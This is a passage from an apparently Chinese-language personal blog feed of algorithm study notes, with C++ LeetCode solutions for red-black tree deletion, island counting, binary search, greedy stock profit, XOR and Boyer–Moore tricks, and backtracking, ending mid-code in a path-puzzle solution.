class="hljs-keyword">if</span> (w-&gt;left-&gt;color == BLACK &amp;&amp; w-&gt;right-&gt;color == BLACK) &#123;<br>                    w-&gt;color = RED;<br>                    x = x-&gt;parent;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-keyword">if</span> (w-&gt;left-&gt;color == BLACK) &#123;<br>                        w-&gt;right-&gt;color = BLACK;<br>                        w-&gt;color = RED;<br>                        leftRotate(w);<br>                        w = x-&gt;parent-&gt;left;<br>                    &#125;<br>                    w-&gt;color = x-&gt;parent-&gt;color;<br>                    x-&gt;parent-&gt;color = BLACK;<br>                    w-&gt;left-&gt;color = BLACK;<br>                    rightRotate(x-&gt;parent);<br>                    x = root;<br>                &#125;<br>            &#125;<br>        &#125;<br>        x-&gt;color = BLACK;<br>    &#125;<br><br>public:<br>    RBTree() &#123;<br>        NIL = new Node(<span class="hljs-number">0</span>);<br>        NIL-&gt;color = BLACK;<br>        NIL-&gt;left = NIL-&gt;right = NIL;<br>        NIL-&gt;parent = NIL;<br>        root = NIL;<br>    &#125;<br><br>    <span class="hljs-type">void</span> <span class="hljs-title function_">insert</span><span class="hljs-params">(<span class="hljs-type">int</span> key)</span> &#123;<br>        Node* z = new Node(key);<br>        z-&gt;left = z-&gt;right = NIL;<br>        z-&gt;parent = NIL;<br><br>        Node* y = NIL;<br>        Node* x = root;<br>        <span class="hljs-keyword">while</span> (x != NIL) &#123;<br>            y = x;<br>            x = (key &lt; x-&gt;key) ? x-&gt;left : x-&gt;right;<br>        &#125;<br><br>        z-&gt;parent = y;<br>        <span class="hljs-keyword">if</span> (y == NIL)<br>            root = z;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (key &lt; y-&gt;key)<br>            y-&gt;left = z;<br>        <span class="hljs-keyword">else</span><br>            y-&gt;right = z;<br><br>        z-&gt;color = RED; <span class="hljs-comment">// 无脑置红</span><br>        insertFix(z);   <span class="hljs-comment">// 插入修复</span><br>    &#125;<br><br>    <span class="hljs-type">void</span> <span class="hljs-title function_">remove</span><span class="hljs-params">(<span class="hljs-type">int</span> key)</span> &#123;<br>        Node* z = root;<br>        <span class="hljs-keyword">while</span> (z != NIL &amp;&amp; z-&gt;key != key) &#123;<br>            z = (key &lt; z-&gt;key) ? z-&gt;left : z-&gt;right;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (z == NIL)<br>            <span class="hljs-keyword">return</span>;<br><br>        Node* y = z; <span class="hljs-comment">// y 是最终要被删的节点</span><br>        Color yColor = y-&gt;color;<br>        Node* x;<br><br>        <span class="hljs-comment">// 只有左/右孩子 代替后变黑</span><br>        <span class="hljs-keyword">if</span> (z-&gt;left == NIL) &#123;<br>            x = z-&gt;right;<br>            transplant(z, z-&gt;right);<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (z-&gt;right == NIL) &#123;<br>            x = z-&gt;left;<br>            transplant(z, z-&gt;left);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">// 有两个孩子</span><br>            y = minimum(z-&gt;right);<br>            yColor = y-&gt;color;<br>            x = y-&gt;right;<br><br>            <span class="hljs-comment">// 逆天...</span><br>            <span class="hljs-keyword">if</span> (y-&gt;parent != z) &#123;<br>                transplant(y, y-&gt;right);<br>                y-&gt;right = z-&gt;right;<br>                y-&gt;right-&gt;parent = y;<br>            &#125;<br><br>            transplant(z, y);<br>            y-&gt;left = z-&gt;left;<br>            y-&gt;left-&gt;parent = y;<br>            y-&gt;color = z-&gt;color;<br>        &#125;<br><br>        <span class="hljs-comment">// 没有孩子 红色直接删除 黑色分类讨论</span><br>        <span class="hljs-keyword">if</span> (yColor == BLACK)<br>            deleteFix(x);<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p>还有好多树啊…</p><p>慢慢来…</p>]]></content>
    
    
    <categories>
      
      <category>数据结构与算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>LeetCode</tag>
      
      <tag>二叉树</tag>
      
      <tag>数据结构</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>图论</title>
    <link href="/2026/01/19/%E5%9B%BE%E8%AE%BA/"/>
    <url>/2026/01/19/%E5%9B%BE%E8%AE%BA/</url>
    
    <content type="html"><![CDATA[<h1 id="图论"><a href="#图论" class="headerlink" title="图论"></a>图论</h1><p><strong>图</strong>是什么???</p><p>感觉好神秘啊</p><p>我也不知道</p><p>但是</p><p>应该是一种神秘的数据结构吧!</p><p>(我还没学离散数学 先摆了! 虽然好像没什么关系 但是先摆了!)</p><h2 id="200-岛屿数量"><a href="#200-岛屿数量" class="headerlink" title="200.岛屿数量"></a>200.岛屿数量</h2><p><img src="/images/46.png" alt="如图"></p><p>深度优先算法和广度优先算法</p><p>应该蛮好理解的吧…</p><h3 id="DFS解法"><a href="#DFS解法" class="headerlink" title="DFS解法"></a>DFS解法</h3><p><strong>深度优先搜索</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-type">int</span> m,n;<br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">dfs</span><span class="hljs-params">(vector&lt;vector&lt;<span class="hljs-type">char</span>&gt;&gt;&amp; grid,<span class="hljs-type">int</span> x,<span class="hljs-type">int</span> y)</span></span>&#123;<br>        <span class="hljs-keyword">if</span>(x&lt;<span class="hljs-number">0</span>||x&gt;=m||y&lt;<span class="hljs-number">0</span>||y&gt;=n||grid[x][y]==<span class="hljs-string">&#x27;0&#x27;</span>) <span class="hljs-keyword">return</span>; <span class="hljs-comment">//越界 or 遇到水 直接停</span><br>        grid[x][y] = <span class="hljs-string">&#x27;0&#x27;</span>; <span class="hljs-comment">//把当前陆地淹掉</span><br>        <span class="hljs-built_in">dfs</span>(grid,x<span class="hljs-number">+1</span>,y);<br>        <span class="hljs-built_in">dfs</span>(grid,x<span class="hljs-number">-1</span>,y);  <span class="hljs-comment">//四个方向递归</span><br>        <span class="hljs-built_in">dfs</span>(grid,x,y<span class="hljs-number">+1</span>);<br>        <span class="hljs-built_in">dfs</span>(grid,x,y<span class="hljs-number">-1</span>);<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">numIslands</span><span class="hljs-params">(vector&lt;vector&lt;<span class="hljs-type">char</span>&gt;&gt;&amp; grid)</span> </span>&#123;<br>        m = grid.<span class="hljs-built_in">size</span>();<br>        n = grid[<span class="hljs-number">0</span>].<span class="hljs-built_in">size</span>();<br>        <span class="hljs-type">int</span> count = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; m; i++)&#123;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; n; j++)&#123;<br>                <span class="hljs-keyword">if</span>(grid[i][j] == <span class="hljs-string">&#x27;1&#x27;</span>)&#123;<br>                    count++;  <span class="hljs-comment">//发现一个新岛</span><br>                    <span class="hljs-built_in">dfs</span>(grid,i,j); <span class="hljs-comment">//淹掉整个岛屿</span><br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> count;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="BFS解法"><a href="#BFS解法" class="headerlink" title="BFS解法"></a>BFS解法</h3><p><strong>广度优先搜索</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">numIslands</span><span class="hljs-params">(vector&lt;vector&lt;<span class="hljs-type">char</span>&gt;&gt;&amp; grid)</span> </span>&#123;<br>        <span class="hljs-type">int</span> m = grid.<span class="hljs-built_in">size</span>();<br>        <span class="hljs-type">int</span> n = grid[<span class="hljs-number">0</span>].<span class="hljs-built_in">size</span>();<br>        <span class="hljs-type">int</span> count = <span class="hljs-number">0</span>;<br>        <span class="hljs-type">int</span> dx[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">-1</span>&#125;;<br>        <span class="hljs-type">int</span> dy[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>&#125;;<br>        queue&lt;pair&lt;<span class="hljs-type">int</span>, <span class="hljs-type">int</span>&gt;&gt; q;  <span class="hljs-comment">//队列</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; m; i++) &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; n; j++) &#123;<br>                <span class="hljs-keyword">if</span> (grid[i][j] == <span class="hljs-string">&#x27;1&#x27;</span>) &#123;<br>                    count++;<br>                    grid[i][j] = <span class="hljs-string">&#x27;0&#x27;</span>;<br>                    q.<span class="hljs-built_in">push</span>(&#123;i, j&#125;);<br>                    <span class="hljs-keyword">while</span> (!q.<span class="hljs-built_in">empty</span>()) &#123;<br>                        <span class="hljs-keyword">auto</span> [x, y] = q.<span class="hljs-built_in">front</span>();<br>                        q.<span class="hljs-built_in">pop</span>();<br>                        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> k = <span class="hljs-number">0</span>; k &lt; <span class="hljs-number">4</span>; k++) &#123;<br>                            <span class="hljs-type">int</span> nx = x + dx[k];<br>                            <span class="hljs-type">int</span> ny = y + dy[k];<br>                            <span class="hljs-keyword">if</span> (nx &gt;= <span class="hljs-number">0</span> &amp;&amp; nx &lt; m &amp;&amp; ny &gt;= <span class="hljs-number">0</span> &amp;&amp; ny &lt; n &amp;&amp;<br>                                grid[nx][ny] == <span class="hljs-string">&#x27;1&#x27;</span>) &#123;<br>                                grid[nx][ny] = <span class="hljs-string">&#x27;0&#x27;</span>;<br>                                q.<span class="hljs-built_in">push</span>(&#123;nx, ny&#125;);<br>                            &#125;<br>                        &#125;<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> count;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>数据结构与算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>LeetCode</tag>
      
      <tag>图</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>二分</title>
    <link href="/2026/01/19/%E4%BA%8C%E5%88%86/"/>
    <url>/2026/01/19/%E4%BA%8C%E5%88%86/</url>
    
    <content type="html"><![CDATA[<h1 id="二分查找"><a href="#二分查找" class="headerlink" title="二分查找"></a>二分查找</h1><p>一种在高中数学中便见过的算法思想</p><p>思想本身不难理解</p><p>难点在于边界的讨论</p><p>日后再写吧…</p><p>简单做了一道题…</p><h2 id="35-搜索插入位置"><a href="#35-搜索插入位置" class="headerlink" title="35.搜索插入位置"></a>35.搜索插入位置</h2><p><img src="/images/45.png" alt="如图"></p><p>解：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">searchInsert</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums, <span class="hljs-type">int</span> target)</span> </span>&#123;<br>        <span class="hljs-type">int</span> left = <span class="hljs-number">0</span>;<br>        <span class="hljs-type">int</span> right = nums.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">while</span> (left &lt;= right) &#123; <br>            <span class="hljs-type">int</span> mid = left + (right - left) / <span class="hljs-number">2</span>;  <span class="hljs-comment">//二分法</span><br>            <span class="hljs-keyword">if</span> (nums[mid] == target) &#123;<br>                <span class="hljs-keyword">return</span> mid;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (nums[mid] &lt; target) &#123;<br>                left = mid + <span class="hljs-number">1</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                right = mid - <span class="hljs-number">1</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> left;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>数据结构与算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>LeetCode</tag>
      
      <tag>二分查找</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>堆</title>
    <link href="/2026/01/19/%E5%A0%86/"/>
    <url>/2026/01/19/%E5%A0%86/</url>
    
    <content type="html"><![CDATA[<h1 id="堆"><a href="#堆" class="headerlink" title="堆"></a>堆</h1><p>我以为是啥呢</p><p>结果是一种树???</p><p>插眼…</p>]]></content>
    
    
    <categories>
      
      <category>数据结构与算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>堆</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>贪心</title>
    <link href="/2026/01/19/%E8%B4%AA%E5%BF%83/"/>
    <url>/2026/01/19/%E8%B4%AA%E5%BF%83/</url>
    
    <content type="html"><![CDATA[<h1 id="贪心算法"><a href="#贪心算法" class="headerlink" title="贪心算法"></a>贪心算法</h1><p>贪心算法</p><p>顾名思义</p><p>重点在贪心</p><p>即</p><p>每一步都做出当前看来最优选择的算法思想</p><p>其核心假设是</p><p>局部最优的选择，能够导向全局最优的结果</p><p>需要注意的是，这里的“最优”并非基于未来状态的全局搜索，而仅依赖于当前已知的信息</p><p>有点意思…</p><p>不过</p><p>你确定吗???</p><h2 id="121-买卖股票的最佳时机"><a href="#121-买卖股票的最佳时机" class="headerlink" title="121.买卖股票的最佳时机"></a>121.买卖股票的最佳时机</h2><p>兄弟</p><p>学了这个能成为股神吗???</p><p><img src="/images/59.png" alt="如图"></p><p><code>贪心算法</code></p><p>解：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">maxProfit</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; prices)</span> </span>&#123;<br>        <span class="hljs-type">int</span> minPrice = INT_MAX;<br>        <span class="hljs-type">int</span> maxProfit = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> price : prices)&#123;<br>            minPrice = <span class="hljs-built_in">min</span>(minPrice, price);<br>            maxProfit = <span class="hljs-built_in">max</span>(maxProfit, price - minPrice);<br>        &#125;<br>        <span class="hljs-keyword">return</span> maxProfit;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>数据结构与算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>贪心</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>trick</title>
    <link href="/2026/01/19/trick/"/>
    <url>/2026/01/19/trick/</url>
    
    <content type="html"><![CDATA[<h1 id="trick"><a href="#trick" class="headerlink" title="trick"></a>trick</h1><p>一些小巧思</p><p>佩服古人的智慧!</p><h2 id="136-只出现一次的数字"><a href="#136-只出现一次的数字" class="headerlink" title="136.只出现一次的数字"></a>136.只出现一次的数字</h2><p><img src="/images/32.png" alt="如图"></p><p>巧妙利用<strong>异或</strong>的性质</p><p>解：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">singleNumber</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums)</span> </span>&#123;<br>        <span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> c : nums)&#123;<br>            ans ^= c;<br>        &#125;<br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="169-多数元素"><a href="#169-多数元素" class="headerlink" title="169.多数元素"></a>169.多数元素</h2><p><img src="/images/33.png" alt="如图"></p><p><code>Boyer–Moore 投票算法</code></p><p>解：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">majorityElement</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums)</span> </span>&#123;<br>        <span class="hljs-type">int</span> count = <span class="hljs-number">0</span>;<br>        <span class="hljs-type">int</span> candidate = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; nums.<span class="hljs-built_in">size</span>(); i++)&#123;<br>            <span class="hljs-keyword">if</span>(count == <span class="hljs-number">0</span>)&#123;<br>                candidate = nums[i];<br>            &#125;<br>            <span class="hljs-keyword">if</span>(nums[i] == candidate)&#123;<br>                count++;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                count--;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> candidate;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>数据结构与算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>LeetCode</tag>
      
      <tag>异或</tag>
      
      <tag>trick</tag>
      
      <tag>算法</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>回溯</title>
    <link href="/2026/01/19/%E5%9B%9E%E6%BA%AF/"/>
    <url>/2026/01/19/%E5%9B%9E%E6%BA%AF/</url>
    
    <content type="html"><![CDATA[<h1 id="回溯算法"><a href="#回溯算法" class="headerlink" title="回溯算法"></a>回溯算法</h1><p>我觉得这个算法很有意思啊</p><p>有点像无限流小说中的那种不断重生探路，死亡回溯，直至找到最佳解法，杀出重围…</p><p>依旧插个眼</p><p>以后补…</p><h2 id="22-括号生成"><a href="#22-括号生成" class="headerlink" title="22.括号生成"></a>22.括号生成</h2><p><img src="/images/27.png" alt="如图"></p><p>解：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">vector&lt;string&gt; <span class="hljs-title">generateParenthesis</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span> </span>&#123;<br>        vector&lt;string&gt; result;<br>        string current;<br>        <span class="hljs-built_in">backtrack</span>(result, current, n, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br><br><span class="hljs-keyword">private</span>:<br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">backtrack</span><span class="hljs-params">(vector&lt;string&gt;&amp; result, string&amp; current, <span class="hljs-type">int</span> n, <span class="hljs-type">int</span> open, <span class="hljs-type">int</span> close)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (current.<span class="hljs-built_in">size</span>() == <span class="hljs-number">2</span> * n) &#123;<br>            result.<span class="hljs-built_in">push_back</span>(current);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-comment">// 回溯!</span><br>        <span class="hljs-keyword">if</span> (open &lt; n) &#123;<br>            current.<span class="hljs-built_in">push_back</span>(<span class="hljs-string">&#x27;(&#x27;</span>);<br>            <span class="hljs-built_in">backtrack</span>(result, current, n, open + <span class="hljs-number">1</span>, close);<br>            current.<span class="hljs-built_in">pop_back</span>();<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (close &lt; open) &#123;<br>            current.<span class="hljs-built_in">push_back</span>(<span class="hljs-string">&#x27;)&#x27;</span>);<br>            <span class="hljs-built_in">backtrack</span>(result, current, n, open, close + <span class="hljs-number">1</span>);<br>            current.<span class="hljs-built_in">pop_back</span>();<br>        &#125;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="路径之谜"><a href="#路径之谜" class="headerlink" title="路径之谜"></a>路径之谜</h2><p><img src="/images/54.png" alt="题目"></p><p><img src="/images/55.png" alt="格式"></p><p><code>剪枝 + 回溯 + DFS</code></p><p>解：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">int</span> n;<br><span class="hljs-type">int</span> north[<span class="hljs-number">15</span>], west[<span class="hljs-number">15</span>];<br><span class="hljs-type">bool</span> visited[<span class="hljs-number">15</span>][<span class="hljs-number">15</span>]; <span class="hljs-comment">//格子 (r,c) 是否已走过</span><br>vector&lt;<span class="hljs-type">int</span>&gt; path;<br><span class="hljs-type">bool</span> finished = <span class="hljs-literal">false</span>;<br><br><span class="hljs-type">int</span> dr[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>&#125;;<br><span class="hljs-type">int</span> dc[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">-1</span>&#125;;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">dfs</span><span class="hljs-params">(<span class="hljs-type">int</span> r, <span class="hljs-type">int</span> c)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (finished) <span class="hljs-keyword">return</span>;<br><br>    path.<span class="hljs-built_in">push_back</span>(r * n + c);<br>    visited[r][c] = <span class="hljs-literal">true</span>;<br>    north[c]--;<br>    west[r]--;<br><br>    <span class="hljs-keyword">if</span> (north[c] &lt; <span class="hljs-number">0</span> || west[r] &lt; <span class="hljs-number">0</span>) &#123;<br>        north[c]++;<br>        west[r]++;<br>        visited[r][c] = <span class="hljs-literal">false</span>;<br>        path.<span class="hljs-built_in">pop_back</span>();<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (r == n - <span class="hljs-number">1</span> &amp;&amp; c == n - <span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-type">bool</span> ok = <span class="hljs-literal">true</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>            <span class="hljs-keyword">if</span> (north[i] != <span class="hljs-number">0</span> || west[i] != <span class="hljs-number">0</span>) &#123;<br>                ok = <span class="hljs-literal">false</span>;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (ok) &#123;<br>            finished = <span class="hljs-literal">true</span>;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">// dfs + 回溯</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> d = <span class="hljs-number">0</span>; d &lt; <span class="hljs-number">4</span>; d++) &#123;<br>        <span class="hljs-type">int</span> nr = r + dr[d];<br>        <span class="hljs-type">int</span> nc = c + dc[d];<br>        <span class="hljs-keyword">if</span> (nr &lt; <span class="hljs-number">0</span> || nc &lt; <span class="hljs-number">0</span> || nr &gt;= n || nc &gt;= n) <span class="hljs-keyword">continue</span>;<br>        <span class="hljs-keyword">if</span> (!visited[nr][nc]) &#123;<br>            <span class="hljs-built_in">dfs</span>(nr, nc);<br>            <span class="hljs-keyword">if</span> (finished) <span class="hljs-keyword">return</span>;<br>        &#125;<br>    &#125;<br><br>    north[c]++;<br>    west[r]++;<br>    visited[r][c] = <span class="hljs-literal">false</span>;<br>    path.<span class="hljs-built_in">pop_back</span>();<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    cin &gt;&gt; n;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span 